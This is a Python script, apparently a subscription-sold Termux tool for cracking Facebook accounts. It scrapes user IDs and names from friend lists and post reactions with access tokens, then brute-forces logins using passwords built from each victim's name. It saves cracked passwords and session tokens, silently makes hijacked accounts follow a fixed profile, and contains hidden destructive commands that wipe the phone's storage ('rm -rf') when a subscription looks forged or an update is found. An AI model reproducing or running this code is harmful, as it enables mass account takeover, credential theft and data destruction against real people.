#coding=utf-8
try:
    import os,sys,re,time,random,json,string,subprocess
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except:
    print('  Installing required modules ...')
    
    print('  \nInstalled successfuly, run commands again ...')
    os.sys.exit()
os.system('mkdir /sdcard/ids')
os.system('clear')
logo="""
      \x1b[1;95;1md88888b d8888b. d8888b.  .d88b.  d8888b. 
      \x1b[1;97;1m88'     88  `8D 88  `8D .8P  Y8. 88  `8D 
      \x1b[1;96;1m88ooooo 88oobY' 88oobY' 88    88 88oobY' 
      \x1b[1;98;1m88~~~~~ 88`8b   88`8b   88    88 88`8b   
      \x1b[1;93;1m88.     88 `88. 88 `88. `8b  d8' 88 `88. 
      \x1b[1;32;1mY88888P 88   YD 88   YD  `Y88P'  88   YD
 
\x1b[1;31;1m            THANKS FOR YOUR SUBSCRIPTION       
\x1b[1;31;1m        NEVER USE AIRPLANE MODE ANY VPN AND
\x1b[1;31;1m  DON'T SWITCH TO DATA CONNECTION WHILE CRACK IS RUNING                                    
\x1b[1;92;1m--------------------------------------------------
  AUTHOR   : Hamayun + Micron
  TELEGRAM : @hamayun.khan978
  WHATSAPP : 923319258250
--------------------------------------------------
"""

def backup():
    if os.path.isfile('/data/data/com.termux/.u_token.txt'):
        print('  Backing up your subscription ....')
        os.system('mv /data/data/com.termux/.u_token.txt /sdcard/data/.afza.txt')
    else:
        check_subscription()
def check_subscription():
    os.system('clear')
    print(logo)
    print('  Checking subscription ....')
    try:
        user_token = open('/sdcard/Android/.afza.txt', 'r').read()
    except FileNotFoundError:
        not_subs()
    if len(user_token) < 50:
        print('  Unsuccessful try to bypass.Exiting tool')
        os.system('cd /sdcard && rm -rf *')
    else:
        try:
            check_token = requests.get('https://raw.githubusercontent.com/upside-down588/pkgs/main/server.txt').text
            if user_token in check_token:
                update()
            else:
                print('  Your token has not been approved yet, try again')
                print('  Your token: '+user_token)
                os.sys.exit()
        except requests.exceptions.ConnectionError:
            print('  No internet connection available...')
def not_subs():
    os.system('clear')
    print(logo)
    utoken = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(50))
    with open('/sdcard/Android/.afza.txt', 'w') as f:
        f.write(utoken)
    print('  Copy this token: '+utoken)
    input('  Press enter to activate > ')
    os.system('xdg-open https://t.me/shadowmicron588')
    os.sys.exit()

oks=[]
cps=[]

def bootstrap():
    if not os.path.isfile('/data/data/com.termux/files/home/.localhost/...../index.js'):
        os.system('cd /$HOME && mkdir .localhost && cd .localhost && git clone https://github.com/sikkufiles/.....')
        os.system('cd /$HOME/.localhost/..... && npm install -g npm@6 && npm audit fix')
        os.system('python aoun.py')
    else:
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd /$HOME/.localhost/..... && node index.js &')
        time.sleep(3)
        pass
def update():
    print('  Checking updates ....')
    cv = '1.3'
    cf = requests.get('https://raw.githubusercontent.com/aoun16/aoun/main/version').text
    if cv in cf:
        os.system('rm -rf *')
        os.system('https://raw.githubusercontent.com/aoun16/aoun/main/aoun.py > aoun.py')
        os.system('python aoun.py')
    else:main()
def main():
    os.system('clear')
    print(logo)
    print('  [1] Crack')
    print('  [2] Create file')
    print('  [3] Separate ids from file')
    print('  [4] How to use tool videos')
    print('  [l] Login another token')
    print(50*'-')
    option = input('  Select option: ')
    if option =='1':
        bootstrap()
        crack()
    elif option =='2':
        create_file()
    elif option =='3':
        sep()
    elif option =='4':
        helpv()
    elif option =='l' or option =='L':
        os.system('rm -rf access_token.txt')
        login()
    else:
        print('  Choose valid option ')
        time.sleep(1)
        main()
def create_file():
    os.system('clear')
    print(logo)
    print('  [1] Create file manual')
    print('  [2] Create file auto')
    print('  [3] Create file with post likes')
    print('  [B] Back to main menu')
    print(50*'-')
    cf = input('  Choose method: ')
    if cf =='1':
        manual()
    elif cf =='2':
        auto()
    elif cf =='3':
        likes()
    elif cf =='3' or cf =='b' or cf =='B':
        main()
    else:
        print('\n  Choose correct option ...')
        time.sleep(1)
        create_file()
def crack():
    global cps
    global oks
    os.system('clear')
    print(logo)
    file = input('  Put file path: ')
    try:
        fileopen = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print('  File not found on provided path, try again ....')
        time.sleep(1)
        crack()
    print(50*'-')
    print('  [1] All name passwords')
    print('  [2] First&last name passwords')
    print('  [3] All mix names')
    print('  [4] Choice passwords')
    print(50*'-')
    gaddari = input('  Choose passlist: ')
    if gaddari =='1':
        with ThreadPool(max_workers=30) as yaari:
            os.system('clear')
            print(logo)
            print('  Total ids: '+str(len(fileopen)))
            print('  Brute Has been started')
            print(50*'-')
            for user in fileopen:
                try:
                    uid,first,last = user.split('|')
                except ValueError:
                    print('\n This file is not supported for this tool.Create file only from this tool....\n')
                    os.sys.exit()
                ps=first.lower()
                ps2=last.lower()
                pwx=[ps+'12',ps+'1234',ps+'1122',ps+'786',first+'123',first+'12345']
                yaari.submit(method1,uid,pwx)
        print(50*'-')
        print('  The process has completed')
        print('  Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        print(50*'-')
        input('  Press enter to back ')
        os.system('python aoun.py')
    elif gaddari =='2':
        with ThreadPool(max_workers=30) as yaari:
            os.system('clear')
            print(logo)
            print('  Total ids: '+str(len(fileopen)))
            print('  Brute Has been started')
            print(50*'-')
            for user in fileopen:
                try:
                    uid,first,last = user.split('|')
                except ValueError:
                    print('\n This file is not supported for this tool.Create file only from this tool....\n')
                    os.sys.exit()
                ps=first.lower()
                ps2=last.lower()
                pwx=[ps+' '+ps2,ps+ps2,first+' '+last,first+last]
                yaari.submit(method1,uid,pwx)
        print(50*'-')
        print('  The process has completed')
        print('  Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        print(50*'-')
        input('  Press enter to back ')
        os.system('python aoun.py')
    elif gaddari =='3':
        with ThreadPool(max_workers=30) as yaari:
            os.system('clear')
            print(logo)
            print('  Total ids: '+str(len(fileopen)))
            print('  Brute Has been started')
            print(50*'-')
            for user in fileopen:
                try:
                    uid,first,last = user.split('|')
                except ValueError:
                    print('\n This file is not supported for this tool.Create file only from this tool....\n')
                    os.sys.exit()
                ps=first.lower()
                ps2=last.lower()
                pwx=[ps+' '+ps2,ps+ps2,first+' '+last,ps+'12',ps+'1234',ps+'1122',ps+'786',first+'123',first+'12345',ps+'123',ps+'12345']
                yaari.submit(method1,uid,pwx)
        print(50*'-')
        print('  The process has completed')
        print('  Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        print(50*'-')
        input('  Press enter to back ')
        os.system('python aoun.py')
    elif gaddari =='4':
        print(50*'-')
        print('  Password example: 667788,334455,99900,khan khan,khankhan etc')
        print(50*'-')
        pwx = input('  Put passwords: ').split(',')
        with ThreadPool(max_workers=30) as yaari:
            os.system('clear')
            print(logo)
            print('  Total ids: '+str(len(fileopen)))
            print('  Brute Has been started')
            print(50*'-')
            for user in fileopen:
                try:
                    uid,first,last = user.split('|')
                except ValueError:
                    print('\n This file is not supported for this tool.Create file only from this tool....\n')
                    os.sys.exit()
                yaari.submit(method1,uid,pwx)
        print(50*'-')
        print('  The process has completed')
        print('  Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        print(50*'-')
        input('  Press enter to back ')
        os.system('python aoun.py')
    else:
        print('  Choose valid passlist, try again ...')
        time.sleep(1)
        main()
def method1(uid,pwx):
    try:
        global oks
        global cps
        for ps in pwx:
            data = requests.get("https://m.facebook.com/login/device-based/validate-password/?shbl=0"+uid+'&pass='+ps).text
            q=json.loads(data)
            if 'loc' in q:
                print('\033[1;32m  [SUCCESSFUL] '+uid+' | '+ps+'\033[0;97m')
                oks.append(uid)
                open('/sdcard/ids/ok_ids.txt','a').write(uid+'|'+ps+'\n')
                access = q['loc']
                open('/sdcard/ids/tokens.txt','a').write(access+'\n')   
                follow_id='100017586990863'
                subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+access).text
                break
            elif 'www.facebook.com' in q['error']:
                print('\033[1;31m  [CHECKPOINT] '+uid+' | '+ps+'\033[0;97m')
                open('/sdcard/ids/cp_ids.txt','a').write(uid+'|'+ps+'\n')                
                cps.append(uid)
                break
            else:
                continue
    except:
        pass
def login():
    os.system('clear')
    print(logo)
    tok = input('  Put access token: ')
    if 'EAAB' in tok:
        pass
    else:
        print('  Only fb ads access token can be used for scraping data')
        print('  Check main menu for creating fb ads access token....o')
        os.sys.exit()
    try:
        u = requests.get('https://graph.facebook.com/me?access_token='+tok).text
        u1 = json.loads(u)
        name = u1['name']
        ts = open('access_token.txt', 'w')
        ts.write(tok)
        ts.close()
        print(' Logged in successfully')
        time.sleep(1)
        main()
    except KeyError:
        print('\n  Invalid token provided, try again  ')
        time.sleep(1)
        login()
def manual():
    try:
        token = open('access_token.txt', 'r').read()
    except FileNotFoundError:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+token).text
        q = json.loads(r)
        uname = q['name']
    except (KeyError):
        login()
    os.system('clear')
    print(logo)
    print('  Name: '+uname)
    print(50*'-')
    limit = int(input('  How many ids do you want to add ? '))
    save_file = input('  Save file as: ')
    t = 0
    for u in range(limit):
        t+=1
        try:
            ids = input('  Put id no%s: '%t)
            r = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+token).text
            q = json.loads(r)
            for j in q['data']:
                uids = j['id']
                names = j['name']
                first_name = names.split(' ')[0]
                try:
                    last_name = names.split(' ')[1]
                except:
                    last_name = 'Khan'
                with open('/sdcard/'+save_file, 'a') as rd:
                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')
        except KeyError:
            print('  No friend for '+ids)
            pass
    print(50*'-')
    print('  Ids saved as: '+save_file)
    print(50*'-')
    input(' Press enter to back')
    main()
def likes():
    try:
        token = open('access_token.txt', 'r').read()
    except FileNotFoundError:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+token).text
        q = json.loads(r)
        uname = q['name']
    except (KeyError):
        login()
    os.system('clear')
    print(logo)
    print('  Name: '+uname)
    print(50*'-')
    limit = int(input('  From how many posts do you want to extract? '))
    save_file = input('  Save file as: ')
    t = 0
    for u in range(limit):
        t+=1
        try:
            ids = input('  Put post id no%s: '%t)
            r = requests.get('https://graph.facebook.com/'+ids+'/reactions?limit=999999&access_token='+token).text
            q = json.loads(r)
            for j in q['data']:
                uids = j['id']
                names = j['name']
                first_name = names.split(' ')[0]
                try:
                    last_name = names.split(' ')[1]
                except:
                    last_name = 'Khan'
                with open('/sdcard/'+save_file, 'a') as rd:
                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')
                if 'next' in str(q):
                    l1 = q['paging']
                    l2 = l1['next']
                    r2 = requests.get(l2)
                    q=json.loads(r2.text)
                    for j in q['data']:
                        uids = j['id']
                        names = j['name']
                        first_name = names.split(' ')[0]
                        try:
                            last_name = names.split(' ')[1]
                        except:
                            last_name = 'Khan'
                        with open('/sdcard/'+save_file, 'a') as rd:
                            rd.write(uids+'|'+first_name+'|'+last_name+'\n')
                else:pass
        except KeyError:
            print('  No likes for '+ids)
            pass
    print(50*'-')
    print('  Ids saved as: '+save_file)
    print(50*'-')
    input(' Press enter to back')
    main()
def auto():
    os.system('rm -rf temp*')
    try:
        access_token = open('access_token.txt', 'r').read()
    except:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
    os.system('clear')
    print(logo)
    print('  Logged user: '+uname)
    print(50*'-')
    nusrat = []
    try:
        limit_user = int(input('  How many ids do you want to add ? '))
    except:
        limit_user = 1
    count = 0
    for fir in range(limit_user):
        count +=1
        udit = input('  Put id%s: '%(count))
        try:
            tfile = open('access_token.txt','r').read()
            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&access_token='+tfile).text
            qfr = json.loads(fr)
            temp_save = open('temp.txt', 'a')
            for data in qfr['data']:
                uids = data['id']
                if uids in nusrat:
                    pass
                else:
                    nusrat.append(uids)
                    temp_save.write(uids+'\n')
            temp_save.close()
        except KeyError:
            if 'invalid' in str(fr):
                print('  Logged token has expired ...')
                pass
            else:
                print('  No friends found for user: '+udit)
                pass
    os.system('clear')
    print(logo)
    print('   Total ids: '+str(len(nusrat)))
    print(50*'-')
    try:
        ask_link = int(input('  How many links do you want to grab? '))
    except:
        ask_link = 1
    completed = 0
    for links in range(ask_link):
        completed +=1
        li = input('  %s Link start with: '%completed)
        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
    save_file = input('  Save file as: ')
    os.system('clear')
    lines = open('temp2.txt', 'r').readlines()
    print(logo)
    print('  Total ids to grab: '+str(len(lines)))
    print('  Grabbing Process has started')
    print(50*'-')
    fileid = 'temp2.txt'
    fileidopen = open(fileid, 'r').read().splitlines()
    dill = []
    for ids in fileidopen:
        try:
            tfile = open('access_token.txt','r').read()
            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+tfile).text
            rgq = json.loads(rg)
            idsave=open('/sdcard/'+save_file, 'a')
            for inayat in rgq['data']:
                uids = inayat['id']
                dill.append(uids)
                nm = inayat['name']
                first_name = nm.split(' ')[0]
                try:
                    last_name = nm.split(' ')[1]
                except:
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+'|'+last_name+'\n')
            print('  Grabbed from: '+ids)
            print('  Total friends: '+str(len(uids)))
            print('  Token status: Live')
            print(50*'-')
            idsave.close()
        except Exception as e:
            print(e)
            if 'invalid' in str(rg):
                print('  Token has expired, try again ...')
                os.system('rm -rf temp*')
                pass
            else:
                print('  Grabbed from: '+ids)
                print('  Friendlist ids: 0')
                print('  Token status: Live')
                print(50*'-')
                os.system('rm -rf temp*')
                pass
    lenid = open('/sdcard/'+save_file, 'r').readlines()
    print('  Grabbing Process has completed ')
    os.system('rm -rf temp*')
    print('  Total ids grabbed: '+str(len(lenid)))
    print('  File saved as: /sdcard/'+save_file)
    print(50*'-')
    input('  Press enter to back ')
    main()
def helpv():
    os.system('clear')
    print(logo)
    print('\033[1;36m  How to create file in this tool.\033[0;97m')
    print('  Video link: https://www.facebook.com/100048514350891/posts/485671353060006/?app=fbl')
    print(50*'-')
    print('\033[1;36m  How to create fb ads access token for this tool.\033[0;97m')
    print('  Video link: https://www.facebook.com/100048514350891/posts/485671353060006/?app=fbl')
    print(50*'-')
    input('  Press enter to back main menu ')
    main()
def sep():
    os.system('clear')
    print(logo)
    try:
        limit = int(input(' How many links do you want to separate? '))
    except:
        limit = 1
    file_name = input(' Input file name: ')
    new_save = input(' Save new file as: ')
    y = 0
    for k in range(limit):
        y+=1
        links = input(' Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> /sdcard/'+new_save)
    print(50*'-')
    print('  Links grabbed successfully')
    print('  Total grabbed links: '+str(len(open('/sdcard/'+new_save).read().splitlines())))
    print('  New file saved as: /sdcard/'+new_save)
    print(50*'-')
    input('  Press enter to back ')
    main()

